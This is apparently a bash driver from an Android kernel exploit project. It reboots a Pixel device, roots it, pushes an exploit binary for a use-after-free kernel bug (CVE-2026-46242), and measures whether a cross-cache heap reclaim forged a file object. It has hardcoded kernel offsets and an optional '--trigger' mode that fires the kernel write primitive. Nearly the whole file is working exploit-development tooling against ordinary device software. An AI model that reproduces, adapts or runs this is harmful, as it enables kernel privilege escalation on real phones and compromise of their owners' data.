#!/usr/bin/env bash
# hunt-wpoke.sh — systematic reboot-fresh hunt for the CVE-2026-46242 WRITE
# primitive (--wpoke), with a per-shot LANDING ORACLE.
#
# Each shot needs BOTH a fresh quiet boot (the cross-cache reclaim needs a quiet
# SLUB) AND root on that boot (the kprobe oracle that measures delivery). The
# runner does reboot-per-shot XOR root-once, not both, so this driver loops the
# two together, mirroring runner/scripts/hunt-cve64560.sh:
#
#   per shot:  ./pixel-ksu-root --recipe ghostlock   (fresh boot + KernelSU su)
#              arm the ep_insert landing kprobe (root)
#              run oracle46242 --wpoke as SHELL (needs_root=false)
#              read the dangling file D after the reclaim (root)  -> classify
#
# Classification (what occupied the freed filp slot D after CF_SPRAY_DONE):
#   LANDED   D+0x28 (f_op) == eventpoll_fops   -> our inotify forge WON the page
#   REFILL   f_op non-zero, != eventpoll_fops  -> a live file refilled the slot
#   ZERO     all fields 0                      -> block untaken/zeroed (init_on_alloc)
#   UNCLEAN  the forge was byte-unclean this boot (WPOKE_FORGE_UNCLEAN) -> parked
#   NOWIN    the race won no round in the budget
#   PANIC    device rebooted during the shot
#   ROOTFAIL ghostlock did not root this boot
#
# This is a MEASUREMENT hunt: it withholds the trigger GO, so the exploit never
# polls the (possibly un-forged) orphan -- it measures delivery only, no write,
# no panic risk from the poll. Pass --trigger to also fire the write on a LANDED
# shot (survival test; may panic on the ws constraint).
#
# Usage:
#   runner/scripts/hunt-wpoke.sh                 # SHOTS=5 measurement shots
#   SHOTS=12 runner/scripts/hunt-wpoke.sh        # more shots
#   runner/scripts/hunt-wpoke.sh --trigger       # also fire the write when LANDED
#   runner/scripts/hunt-wpoke.sh --digest-only logs/wpoke-shots/<run>
set -u
cd "$(dirname "$0")/../.."
REPO="$PWD"
export ANDROID_NDK_HOME="${ANDROID_NDK_HOME:-/home/jing/Archives/Android/ndk/29.0.14206865}"
TARGET="${TARGET:-panther-CP2A.260705.006}"
SERIAL="${SERIAL:-34061FDH2005Q3}"
MANAGER="${MANAGER:-org.matrix.su}"
SHOTS="${SHOTS:-5}"
ROUNDS="${ROUNDS:-8000000}"
MAXSEC="${MAXSEC:-220}"
EPFOPS_OFF=0x110bc70          # eventpoll_fops image offset (target.h)
D="/data/local/tmp"
BADE="cves/cve-2026-46242-badepoll"
TRIGGER=0
A(){ adb -s "$SERIAL" "$@"; }
ASU(){ A shell "su -c 'sh $1'"; }   # run a pushed device script as root

digest() {  # $1 = shot dir
	local d="$1" f
	echo; echo "================= WPOKE HUNT DIGEST: $d ================="
	[ -f "$d/index.tsv" ] && { echo "-- census --"; awk -F'\t' '{c[$2]++} END{for(k in c)printf "   %-9s %d\n",k,c[k]}' "$d/index.tsv"; }
	echo "-- per shot (shot  outcome  D  f_op  priv) --"
	[ -f "$d/index.tsv" ] && awk -F'\t' '{printf "   %-3s %-10s D=%-20s f_op=%-20s priv=%s\n",$1,$2,$3,$4,$5}' "$d/index.tsv"
	local landed refill_ep refill zero
	landed=$(awk -F'\t' '$2=="LANDED"{n++} END{print n+0}' "$d/index.tsv" 2>/dev/null)
	refill_ep=$(awk -F'\t' '$2=="REFILL_EP"{n++} END{print n+0}' "$d/index.tsv" 2>/dev/null)
	refill=$(awk -F'\t' '$2=="REFILL"{n++} END{print n+0}' "$d/index.tsv" 2>/dev/null)
	zero=$(awk -F'\t' '$2=="ZERO"{n++} END{print n+0}' "$d/index.tsv" 2>/dev/null)
	echo "-- delivery outcome: LANDED=$landed (our forge won) REFILL_EP=$refill_ep (real epoll took it) REFILL=$refill (real file) ZERO=$zero (untaken) --"
	echo "   LANDED>0 => cross-cache delivery CAN be won (our f_op AND private_data target present); tune the reclaim to raise the rate."
}

if [ "${1:-}" = "--digest-only" ]; then digest "$2"; exit 0; fi
[ "${1:-}" = "--trigger" ] && TRIGGER=1

echo "== build the --wpoke binary =="
make -C cves TARGET="$TARGET" RECIPE=badepoll-esc || { echo "build failed"; exit 1; }
BIN="cves/build/$TARGET/cve-2026-46242-oracle"
[ -f "$BIN" ] || { echo "no binary at $BIN"; exit 1; }

RUN=$(date +%Y%m%d-%H%M%S)
OUT="logs/wpoke-shots/$RUN"; mkdir -p "$OUT"; INDEX="$OUT/index.tsv"
echo "== wpoke hunt: $SHOTS shots, trigger=$TRIGGER, out=$OUT =="

for shot in $(seq 1 "$SHOTS"); do
	echo; echo "############## shot $shot / $SHOTS ##############"
	rlog="$OUT/shot-$shot-root.log"

	# 1) FORCE a fresh boot (ghostlock skips its own reboot when KernelSU is
	# already resident, which would reuse a polluted boot), then root it. After a
	# reboot KernelSU is gone, so ghostlock re-roots from scratch on a quiet SLUB.
	echo "  [1] reboot to a fresh boot, then ghostlock root ..."
	A reboot >/dev/null 2>&1; sleep 6; A wait-for-device 2>/dev/null
	A shell 'i=0; while [ $i -lt 45 ]; do [ "$(getprop sys.boot_completed)" = "1" ] && break; sleep 3; i=$((i+1)); done' >/dev/null 2>&1
	sleep 10   # let services settle so the manager answers for the root flow
	./pixel-ksu-root --recipe ghostlock --manager "$MANAGER" --serial "$SERIAL" >"$rlog" 2>&1
	if ! A shell 'su -c id' 2>/dev/null | grep -q 'uid=0'; then
		echo "  ROOTFAIL (see $rlog)"; printf '%s\tROOTFAIL\t-\t-\t-\n' "$shot" >>"$INDEX"; continue
	fi

	# 2) (re)push binary + helpers, arm the landing kprobe
	A push "$BIN" "$D/cve-2026-46242-oracle" >/dev/null 2>&1; A shell chmod 755 "$D/cve-2026-46242-oracle"
	for h in wpoke_arm.sh wpoke_readD.sh wpoke_getD.sh; do A push "$BADE/$h" "$D/$h" >/dev/null 2>&1; A shell chmod 755 "$D/$h"; done
	EPF=$(ASU "$D/wpoke_arm.sh" 2>/dev/null | sed -n 's/EPFOPS=//p' | tr -d '\r')
	[ -z "$EPF" ] && { echo "  arm failed"; printf '%s\tARMFAIL\t-\t-\t-\n' "$shot" >>"$INDEX"; continue; }
	echo "  [2] armed; eventpoll_fops=$EPF"

	# 3) launch --wpoke as shell (uid 2000), detached
	A shell "rm -f $D/wpoke_run.log $D/bp_wpoke_resolved $D/bp_wpoke_go; nohup $D/cve-2026-46242-oracle --wpoke --race $ROUNDS --max-seconds $MAXSEC > $D/wpoke_run.log 2>&1 &" >/dev/null 2>&1
	echo "  [3] --wpoke launched; waiting for reclaim ..."

	# 4) wait (device-side) for the reclaim to finish (pre-trigger signal) or a terminal state
	A shell 'i=0; while [ $i -lt 300 ]; do [ -f /data/local/tmp/bp_wpoke_resolved ] && break; grep -qE "WPOKE_FORGE_UNCLEAN|no_win|NO wins|AAR_NO_BASE" /data/local/tmp/wpoke_run.log 2>/dev/null && break; sleep 1; i=$((i+1)); done; echo waited ${i}s' 2>/dev/null

	# device alive? (panic => gone)
	if ! A shell 'echo alive' 2>/dev/null | grep -q alive; then
		echo "  PANIC (device gone)"; printf '%s\tPANIC\t-\t-\t%s\n' "$shot" "$EPF" >>"$INDEX"
		A wait-for-device 2>/dev/null; sleep 8; continue
	fi

	# terminal non-reclaim states
	if A shell 'grep -qE "WPOKE_FORGE_UNCLEAN" /data/local/tmp/wpoke_run.log 2>/dev/null'; then
		echo "  UNCLEAN (byte-unclean forge this boot)"; printf '%s\tUNCLEAN\t-\t-\t%s\n' "$shot" "$EPF" >>"$INDEX"
		A pull "$D/wpoke_run.log" "$OUT/shot-$shot.log" >/dev/null 2>&1; continue
	fi
	if A shell 'grep -qE "no_win|NO wins" /data/local/tmp/wpoke_run.log 2>/dev/null'; then
		echo "  NOWIN (race won no round)"; printf '%s\tNOWIN\t-\t-\t%s\n' "$shot" "$EPF" >>"$INDEX"
		A pull "$D/wpoke_run.log" "$OUT/shot-$shot.log" >/dev/null 2>&1; continue
	fi

	# 5) reclaim done: read D
	DADDR=$(ASU "$D/wpoke_getD.sh" 2>/dev/null | tr -d '\r' | grep -oE '0x[0-9a-f]+' | head -1)
	if [ -z "$DADDR" ]; then
		echo "  NODCAP (D not captured — resolved but no ei record)"; printf '%s\tNODCAP\t-\t-\t%s\n' "$shot" "$EPF" >>"$INDEX"
		A pull "$D/wpoke_run.log" "$OUT/shot-$shot.log" >/dev/null 2>&1; continue
	fi
	# host-compute the field addresses (device shell mangles 64-bit math)
	read -r A_FOP A_PRIV A_INODE A_COUNT < <(python3 - "$DADDR" <<'PY'
import sys
d=int(sys.argv[1],16)
print(hex(d+0x28),hex(d+0xd8),hex(d+0x20),hex(d+0x38))
PY
)
	FIELDS=$(A shell "su -c 'sh $D/wpoke_readD.sh $A_FOP $A_PRIV $A_INODE $A_COUNT'" 2>/dev/null | tr -d '\r')
	DFOP=$(echo "$FIELDS" | grep -oE 'f_op=0x[0-9a-f]+' | sed 's/f_op=//')
	DPRIV=$(echo "$FIELDS" | grep -oE 'priv=0x[0-9a-f]+' | sed 's/priv=//')
	# our forge's private_data target = base + WPOKE_PRIV_OFF; base = EPF - EPFOPS_OFF
	TPRIV=$(python3 - "$EPF" <<'PY'
import sys
epf=int(sys.argv[1],16); base=epf-0x110bc70
print(hex(base+0x2010508))
PY
)
	echo "  [5] D=$DADDR  $FIELDS  (our target priv=$TPRIV)"

	# 6) classify. A live epoll refill ALSO has f_op==eventpoll_fops, so LANDED
	# requires BOTH our f_op AND our private_data target -- only our inotify forge
	# sets private_data to base+WPOKE_PRIV_OFF.
	outcome="ZERO"
	if [ "$DFOP" = "$EPF" ] && [ "$DPRIV" = "$TPRIV" ]; then outcome="LANDED"
	elif [ "$DFOP" = "$EPF" ]; then outcome="REFILL_EP"      # real epoll refilled the slot
	elif [ -n "$DFOP" ] && [ "$DFOP" != "0x0" ]; then outcome="REFILL"   # real non-epoll file
	fi
	echo "  => $outcome"
	printf '%s\t%s\t%s\t%s\t%s\n' "$shot" "$outcome" "$DADDR" "${DFOP:-?}" "${DPRIV:-?}" >>"$INDEX"

	# 7) optional: fire the write on a LANDED shot (survival test)
	if [ "$TRIGGER" = 1 ] && [ "$outcome" = "LANDED" ]; then
		echo "  [7] --trigger: firing the write (GO)"
		A shell ": > $D/bp_wpoke_go" 2>/dev/null
		A shell 'i=0; while [ $i -lt 20 ]; do grep -qE "WPOKE_TRIGGERED" /data/local/tmp/wpoke_run.log 2>/dev/null && break; sleep 1; i=$((i+1)); done' 2>/dev/null
		A shell 'echo alive' 2>/dev/null | grep -q alive && echo "  SURVIVED the write" || { echo "  PANIC on the write (ws?)"; A wait-for-device 2>/dev/null; }
	fi
	A pull "$D/wpoke_run.log" "$OUT/shot-$shot.log" >/dev/null 2>&1
done

digest "$OUT"
echo; echo "done. index: $INDEX"
